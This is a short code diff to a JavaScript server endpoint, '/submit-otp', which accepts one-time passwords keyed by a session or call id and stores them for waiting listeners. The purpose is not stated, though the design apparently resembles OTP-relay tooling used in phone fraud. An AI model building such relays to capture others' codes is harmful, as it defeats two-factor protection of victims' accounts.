@@ -10,8 +10,10 @@ const pending = {};
 const waiters = {};
 
 app.post('/submit-otp', (req, res) => {
-  const { session_id, otp } = req.body;
-  if (!session_id || !otp) return res.status(400).json({ error: 'Missing fields' });
+  const { otp } = req.body;
+  const session_id = req.body.session_id || req.body.call_id || 'session_' + Date.now();
+
+  if (!otp) return res.status(400).json({ error: 'Missing otp' });
 
   pending[session_id] = { otp, status: 'pending', timestamp: Date.now() };
   delete waiters[session_id];
